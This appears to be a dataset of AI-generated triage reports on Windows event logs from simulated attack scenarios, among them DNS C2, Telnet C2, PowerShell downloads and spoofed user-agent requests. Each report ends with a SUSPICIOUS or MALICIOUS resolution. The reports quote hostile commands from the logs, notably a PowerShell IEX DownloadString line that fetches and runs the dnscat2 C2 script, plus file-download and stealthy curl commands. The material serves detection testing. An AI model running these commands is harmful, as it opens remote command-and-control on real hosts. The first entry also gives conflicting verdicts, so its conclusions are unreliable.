Based on these observations, the log entries indicate suspicious behavior that strongly suggests malicious activity. The PowerShell activity, especially with the extraction and execution of hidden scripts, points to a probable attempt to execute malicious code on the system.

**Resolution**: MALICIOUS

**Guidance**:
- Quarantine the host ""Server002"" for further forensic investigation to confirm and identify the exact scope of the compromise.
- Perform malware analysis on the extracted scripts referenced in the logs.
- Check for additional signs of compromise or lateral movement across the network.

#### Indicators of Suspicious Activity:

1. **Frequent Usage of `wevtutil.exe`**: 
    - Multiple instances of the `wevtutil.exe` utility are noted in the logs. This tool is primarily used to manage event logs on Windows computers. Although it can be used for legitimate purposes, its frequent execution by the user ""SERVER002\\admin_test"" could indicate someone attempting to clear security logs or perform actions without leaving a trace.

2. **PowerShell Execution**:
    - There is an indication of `PowerShell.exe` being executed by the user ""SERVER002\\admin_test"". PowerShell is often used by attackers due to its powerful capabilities and native presence in Windows environments. The lack of detailed command-line arguments in the logs prevents a deeper inspection of what was executed.

3. **Command Execution with `cmd.exe`**:
    - The execution of `cmd.exe` with a script (`wscript.exe ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data-download-file.vbs""`) is suspicious. The use of VBScript potentially indicates an attempt to execute a script that could be downloading or launching other payloads, which is a common tactic in malicious activities.

4. **Presence of Script Host (`wscript.exe`)**:
    - The usage of `wscript.exe` to execute VBScript files can be used for legitimate tasks; however, it is also a frequent technique used in malware execution for its ability to run scripts that download and execute additional payloads. 

5. **Unusual Path and Temp Directory Usage**:
    - There is an observation of temporary files and directories within paths like `C:\\Program Files (x86)\\Microsoft\\Temp\\EU7D83.tmp\\`. The usage of such paths often signifies that something potentially malicious or unauthorized is occurring, especially when associated with binary execution.

#### Assessment:

Although the logs capture what could be legitimate updates for Microsoft Edge or system management tasks, the combination of these processes—especially considering the execution of `cmd.exe`, `wscript.exe`, and `PowerShell.exe` with potentially obfuscated or generic-looking scripts—suggests that this is not baseline activity. The frequent `wevtutil.exe` execution further suggests an attempt to manipulate or clear event logs.

#### Resolution: **SUSPICIOUS**

Given the observed activities:
- `wevtutil.exe` usage suggests potential log clearing attempts.
- Usage of `cmd.exe` and `wscript.exe` to execute scripts from temporary folders is a known technique in post-exploitation frameworks.
- PowerShell execution without detailed command lines is a common red flag in cybersecurity due to its potency and abuse in attacks.

### Guidance on How to Proceed

- **Immediate Action**: Consider isolating the host from the network to prevent potential further compromise.
- **Deep Dive Investigation**:
  - Check the contents and purpose of the VBScript and any suspiciously named or located files.
  - Analyze network traffic from this host for potential data exfiltration or C2 communication.
  - Review recent user access logs and permission changes for any unauthorized actions or privilege escalations.
- **Enhance Monitoring**: Increase logging and review policies around the use of `PowerShell`, `cmd`, and script hosts on critical systems.
- **Team Coordination**: Engage with IT and incident response teams to validate and contain any potential threats quickly.

These logs necessitate further inspection to conclusively determine if these activities were benign processes or part of a more significant security event."
Malicious User Agents - CMD,"After thoroughly analyzing the provided logs, I have identified several activities worth noting, particularly focusing on Microsoft Edge Update and command execution involving tools such as PowerShell and curl.

1. **Microsoft Edge Update Activity**:
   - Several entries relate to processes executed by Microsoft Edge Update components. These processes typically run under the `NT AUTHORITY\SYSTEM` account, which is typical for many update operations. The parent processes and command-line arguments indicate standard update operations are being conducted, such as COM registration and service creation.
   - The presence of Microsoft Edge Update processes appearing with services like `MicrosoftEdgeUpdateComRegisterShell64.exe` and `MicrosoftEdgeUpdate.exe` is consistent with routine update tasks. The command lines used, `/svc`, `/regserver`, and `/installsource core`, align with typical updater behavior.

2. **PowerShell and Event Log Utility Execution**:
   - The logs show the execution of `powershell.exe` and `wevtutil.exe` by a user `SERVER002\admin_test`. While PowerShell is a legitimate tool used for administration, its execution should be audited due to its potential misuse for malicious activity. The combination with `wevtutil.exe`, a command-line tool for managing Windows event logs, can be suspicious if not part of a regular maintenance procedure. However, without specific context or command-line arguments provided in the logs that suggest event log tampering or another form of misuse, this activity remains suspicious but not conclusively malicious.

3. **Use of Curl via Command Prompt**:
   - The command `cmd.exe /c C:\Windows\System32\Curl.exe` with various user agents to access `www.google.com` suggests some form of network reconnaissance or health check is being performed. The use of different user agents (`HttpBrowser/1.0`, `Wget`, `Opera`) and masking output with `>nul 2>&1` imply the tests are done stealthily, which is often associated with malware or unauthorized checks. Such behavior can be indicative of a malicious script attempting to masquerade or evade detection.

4. **System Utilities Execution**:
   - Commands such as `hostname.exe` and `whoami.exe` could be indicative of privilege or network reconnaissance. While they are benign tools, their unexplained presence in close sequence may suggest an automated script or tool operation.

Based on the details analyzed, the activities appear suspicious given the apparent reconnaissance-like checking using curl, combined with administrative use of PowerShell and event log utility. However, these activities alone do not provide substantial evidence of a confirmed malicious action without considering broader context or additional data.

**Resolution: SUSPICIOUS**

**Guidance**:
- Conduct further investigation into the context of these activities, particularly focusing on the intent behind `cmd.exe` and `curl.exe` executions.
- Review access logs and any correlating activity at the time of these events for potential unauthorized access or data exfiltration.
- Ensure monitoring for repeated patterns or unusual spikes of these utilities' execution in future logs.
- If feasible, interview `SERVER002\admin_test` user regarding the PowerShell and event log utility use to determine if they align with legitimate administration tasks."
Windows - PowerShell Download,"Upon reviewing the provided event logs from Server002, the following observations have been made:

### Suspicious Activity:

1. **PowerShell Activity**: 
   - Multiple PowerShell commands were executed with the intent to download a file from an external URL using the command: 
     ```
     powershell.exe & {(New-Object System.Net.WebClient).DownloadFile(""https://raw.githubusercontent.com/file/file-file/master/LICENSE.txt"", ""$env:TEMP\\file-license.txt"")}
     ```
   - Executing PowerShell scripts to download files from the internet can indicate a potential unauthorized or malicious activity, especially if the source URL is not commonly accessed or known.

2. **Sysmon Activity**:
   - Several instances of `MicrosoftEdgeUpdate.exe` and related processes were executed with various command-line arguments. 
   - The focus on different command-line arguments such as `/regsvc`, `/regserver`, `/service`, and network-related flags might suggest these updates were automated or unattended installations. However, repeated launches and the involvement of temporary directories (e.g., `C:\\Program Files (x86)\\Microsoft\\Temp\\EU6F2B.tmp\\`) can occasionally be seen in legitimate updates or indicate tampering.
   - Continuous spawning of processes related to Edge updates with varying parameters warrants further scrutiny to ensure no misconfigurations or unauthorized actions were made.

3. **Use of Administrative Accounts**:
   - Admin accounts like `SERVER002\\admin_test` executed several system utilities such as `wevtutil.exe` and `conhost.exe`, which are used for event log management and console handling, respectively. The legitimate use of these tools would be expected, but their presence in conjunction with the PowerShell activity suggests a need for investigation into the context and legitimacy of these administrative actions.

### Additional Observations:
- No critical alerts or anomalies were detected within the logs that explicitly confirm the presence of known malware or direct system compromise.
- The pattern shows repeated system activity mainly focused on updating operations for Microsoft Edge, mixed with some erratic PowerShell script usage.

### Assessment:
Based on the logs analyzed, the activity cannot be categorically classified under **malicious** due to the absence of overtly harmful actions or indicators of compromise. However, the execution of PowerShell scripts for downloading files from an unverified source, along with the nuanced usage of Edge Update processes, constitutes a **suspicious** activity level.

### Resolution: SUSPICIOUS

### Guidance:
1. **Further Review**: Investigate the legitimacy of the PowerShell scripts used. Verify if they are expected behavior for system or network maintenance or possibly from a scheduled task.
2. **Source Validation**: Validate the external URL accessed via PowerShell against known databases or with the IT team to ensure it is not linked to malicious sites.
3. **Edge Update**: Assess the processes and update flow for Microsoft Edge to confirm they align with expected update routines or identify any unauthorized installations.
4. **Network Monitoring**: Implement temporary enhanced monitoring for outbound network connections from Server002.
5. **User Activity**: Review the accounts and their activity around the times these logs were collected, focusing specifically on `admin_test`, to establish whether the activities conducted were approved and necessary.

Reassess the situation based on findings from these actions to further refine classification and take additional security measures or alerts if necessary."
DNS over HTTPS Long Domain Query,"Analyzing the event logs provided, here are some observations:

**1. Windows Security Logs:**
- Event ID 4616 logs indicate a time change operation but it appears to be by the `LOCAL SERVICE` account and associated with the `svchost.exe` process. This could be part of regular system updates or changes in daylight savings time or time server resynchronization.

**2. System Logs:**
- Event IDs for time change (`1` and `24`) and time provider election (`35`) appear again mentioning `svchost.exe`. This suggests time adjustment functions which generally are routine unless associated with other malicious activities.

**3. Sysmon Logs:**
- Repeated execution of `wevtutil.exe` and `conhost.exe` by `SERVER002\admin_test` seems consistent with administrative tasks rather than inherently malicious. `wevtutil.exe` is a utility for querying event logs and `conhost.exe` is a default console window host.
- Use of `powershell.exe` with a script (`data-doh-domain-length.ps1`) from what appears to be a user `admin_test` is more concerning if not recognized as part of a routine task. This script involves network communication with 8.8.8.8 (Google DNS) which, if unexpected, could be seen as suspicious activity. The execution of PowerShell with potentially sensitive or external commands is a known target for abuse in malicious activities.
- Several instances of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) seem consistent with software updates, typically benign.

**4. Application Logs:**
- Logs show normal edge update service stop messages, which align with typical software update processes.

**5. Windows PowerShell Logs:**
- Execution of a PowerShell script with specified command lines involved, including reach-out to an external server (8.8.8.8/resolve), warrants scrutiny. This points to potential data exfiltration or misuse of DNS queries for purposes like bypassing network security measures.

### Assessment:
The PowerShell script execution and its command line arguments are likely the most notable anomaly and potentially suspicious behavior in the logs, especially if unauthorized or unexpected by the server's regular operations context.

### Resolution:
**SUSPICIOUS** - The logs indicate activity (specifically PowerShell execution with a DNS query to a non-standard server) that could be suspicious and warrant further investigation. It's crucial to verify the legitimacy of this script execution, assess if it aligns with known administrative tasks, or check if it could be related to any user actions or applications running on the system."
DNS C2,"### Analysis

Upon reviewing the provided Windows event logs, distinct evidence of potential malicious behavior was identified. Below are the key observations from different sections of the logs:

#### Windows PowerShell Log
- **Event:** Evidence of a PowerShell script being executed: `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')`.
- **Analysis:** The script appears to be related to 'dnscat2', a known tool for command-and-control via DNS, indicating that the system was likely compromised or was attempting to be used for malicious purposes.
  
#### Security Log
- **Event 4624:** A series of logon events occur, suggesting potential lateral movement or privilege escalation attempts. All actions were performed by the SYSTEM account.
- **Event 4672:** Indicates a system-level account was granted a wide range of privileges which could be exploited for further malicious activity.

#### Sysmon Log
- **Process Creation:** `powershell.exe` was launched with a suspicious command line, matching the PowerShell activity from the logs above, confirming execution of potentially harmful scripts.
- **Other Observations:** Multiple suspicious processes were spawned, many associated with `MicrosoftEdgeUpdate.exe`, which in standard behavior should not exhibit such excessive process creation patterns and command-line arguments, suggesting exploitation or masquerading.

#### Findings
The presence of the dnscat2 script being loaded and executed is highly indicative of malicious behavior, designed to establish covert channels for data exfiltration or remote command execution. Privilege escalation activities observed in the security logs and inconsistencies in the sysmon logs further reinforce this assessment.

### Conclusion

The analysis of the logs confirms the presence of malicious activity on the Windows host. The execution of scripts from remote repositories and the behavior of processes indicate a compromise, likely involving malicious command-and-control operations.

### Resolution
**Resolution: MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Containment:** Isolate the affected host from the network to prevent further spread or data exfiltration.
2. **Forensic Analysis:** Perform in-depth forensic analysis to verify the scope of the compromise and identify other potential affected systems.
3. **System Cleanup:** Remove all suspicious scripts and binaries, particularly those relating to dnscat2, and apply patches.
4. **Review and Enhance Security:** Implement stronger PowerShell logging policies and network segmentation to prevent future incidents.
5. **User Awareness:** Inform and educate users about suspicious activities and the importance of network hygiene."
Telnet C2,"From the provided log entries for analysis, here are some observations:

1. **Windows PowerShell Activity**:
   - Multiple PowerShell events have been logged where a command was executed to run a `telnet_client.exe` application connecting to localhost on port 23 using PowerShell. This process is invoked from a temporary location. 
   - PowerShell was used by an account `SERVER002\\admin_test`.

2. **Sysmon Observations**:
   - There are several Sysmon logs showing the execution of processes, particularly `powershell.exe` and `telnet_client.exe`, under the user `SERVER002\\admin_test`.
   - The execution of `telnet_client.exe` from a temp directory via PowerShell appears to be suspicious. Running executables from temp directories can often indicate malicious activity as it is a common tactic for malware to operate from temporary storage before actual installation to avoid detection.
   - We also see `wevtutil.exe` and `whoami.exe` which are standard Windows executables. Their invocation itself is generally normal, but since they are accompanying the use of PowerShell in an unusual execution path, it might need further investigation.

3. **Edge Update Execution**:
   - Multiple instances of Microsoft Edge Update service execution are being logged. These logs show the Edge Update service performing updates and other routine installation activities.
   - However, the Edge Update entries, given the context of system management and updates, appear non-malicious and in accordance with scheduled or automated system updates.

### Conclusion:

- **Suspicious Activity**: The use of PowerShell to run a telnet client from a temporary directory and attempting to establish a connection on the localhost is suspicious. This behavior points towards potential misuse of administrative actions or a possible script being executed that could be part of an unauthorized surveillance or control mechanism. Such tactics are often employed by adversaries after gaining initial access to a system.
- **Malicious / Compromise Indicators**: The logs regarding `edgeupdate` services stopping were noticed at times matching the suspicious PowerShell activity. Normally `edgeupdate` does not need to stop unless it is during system maintenance, which was not observed.
- **Risk Assessment**: The activities have the hallmark of initial reconnaissance for lateral movement or data exfiltration.

### Resolution: **SUSPICIOUS**

The presented activities warrant further investigation to determine authenticity and legitimacy:
- Verify the legitimacy of the user `SERVER002\\admin_test` and their recent activities.
- Investigate the script or process that led to PowerShell executing from a temporary directory.
- Check network and firewall logs for any unusual outbound connections originating from the device.
- Ensure the system is up to date with patches and security measures.

Additional protective steps may need to be taken, including endpoint isolation, if further investigation confirms malicious behavior."
Malicious User Agents - Powershell,"Upon analyzing the provided Windows event logs, I have identified several activities that warrant further scrutiny:

1. **Security Log (EventID 4799)**:
   - The referenced process `""C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\Install\\{D37B3106-C5ED-42F9-8C39-693855CFEAA1}\\EDGEMITMP_A4A59.tmp\\setup.exe""` appears as part of the process tree. This could be legitimate behavior for a software update, but further validation of the installer path and context is recommended since attackers can leverage legitimate processes for malicious tasks (living off the land).

2. **Windows PowerShell Log**:
   - The series of `Invoke-WebRequest` commands targeting `www.google.com` with different User-Agent strings represents potentially benign behavior if used for testing HTTP responses; however, it could also be used to determine internet connectivity or perform reconnaissance in a nefarious context. The obfuscation with different user agents and repeating request patterns could be part of a scripted action.

3. **Sysmon Log (EventID 1 & 5)**:
   - A heavy presence of legitimate Windows processes like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` spawned by `wsmprovhost.exe` without clear malicious intent indicates normal behavior unless further context is given.
   - The PowerShell process spawning with similar `Invoke-WebRequest` patterns as in the Windows PowerShell log reinforces the need for inquiry into its sourcing process.

4. **Edge Update Activity**:
   - Numerous executions of setup.exe from `C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\Install\\` seem to indicate regular update activity. Critical to assess here is verifying these events align with scheduled or known Edge updates.

5. **Service-related Processes**:
   - Processes like `sppsvc.exe` (Software Protection Platform Service) and `svchost.exe` with typical command lines align with system maintenance or service management tasks.

**Assessment**:  
The logs contain patterns typical of system updates and standard administrative activity. However, due to the multiple PowerShell web requests with various User-Agent strings, and an ambiguous `setup.exe` path, there are elements that might warrant additional evaluation to rule out misuse.

**Resolution**:  
- **SUSPICIOUS**: Further investigation is advised to verify:
  - The legitimacy of the PowerShell web requests.
  - The authenticity and schedule of the Edge Update executions.
  - No deviations in expected behavior for these activities align with internal legitimate operational tasks. Monitoring these elements for repeated or escalated activity could provide additional insights into their intention."
File Download via PowerShell,"**Analysis of Logs:**

### Application Log
- **EventID 16384**: This event pertains to the Microsoft-Windows-Security-SPP (Software Protection Platform Service) indicating normal system operations related to software licensing. The event data does not suggest any irregular activity.

### Security Log
- **EventID 4616**: This event was raised by the LOCAL SERVICE account and indicates a change in system time. The time was set back a few seconds, which is not common and could be suspicious, especially if done multiple times in short intervals, as altering system time is a tactic sometimes used in malicious activity such as log manipulation.
  
### Windows PowerShell Log
- **EventID 600**: These events indicate that a PowerShell script was executed, which included downloading a file from an external URL via PowerShell and saving it locally. The use of `New-Object Net.WebClient` to download a file is a known method used in malicious activities for downloading payloads or scripts. This activity is highly suspicious and warrants further investigation.

### System Log
- **Time Change Events**: Consistent with the Security log, these logs reflect the time change actions performed by the svchost.exe process. Without more context or additional suspicious activity, it might be benign or part of a configuration management task, but it should be monitored closely as it is prone to misuse.

### Sysmon Log
- **Process Executions & CommandLine**:
  - Execution of legitimate Windows utilities like `whoami.exe` and `hostname.exe` are visible, which are benign unless correlated with malicious contexts.
  - The execution of `powershell.exe` with a URL download command aligns with the PowerShell log's suspicious download activity.
  - Frequent opening of `notepad.exe` could be benign, but considering the parent process is a suspicious PowerShell command, this chain needs to be deeply evaluated.
- **Wevtutil & Conhost Usage**: `wevtutil.exe` is commonly used in log maintenance tasks. However, repeated executions without clear administrative or known scripts context could be suspect in events preceding or following suspicious activities.

### Conclusion and Recommendations

Given the outlined events:

1. **Suspicious PowerShell Activity** due to downloading and execution from an unverified URL is particularly concerning. This strongly hints at potential exploitation or preparatory phases of compromise, such as delivery and execution of payloads.

2. **Time Change Events** raise suspicion due to potential misuse for hiding malicious activities or matching timestamps for other actions. Although it is sometimes done for legitimate reasons, this context needs investigating.

3. The multitude of `wevtutil.exe` executions along with the PowerShell activity suggest attempts at log manipulation or cleanup post-suspicious activities, a common tactic used for covering tracks.

Due to the nature and combination of suspicious behaviors identified in the logs, further detailed investigation is required to confirm malicious actions or verify benign administrative processes. In particular, focus should be on cross-referencing IP connections, unusual logon activities, and other system changes that coincide with these events.

**Resolution: SUSPICIOUS**

Immediate steps should include:
- Isolate the affected system networks until further assessment if potential lateral movement is suspected.
- Audit all administrative scripts and scheduled tasks for unexpected changes.
- Conduct a thorough review of internet traffic logs and block any unauthorized or suspicious URLs.
- Increase monitoring of affected users and services for unusual activity.

Engage with incident response teams to perform deeper hunts and possibly analyze affected systems for signs of compromise or further incidents."
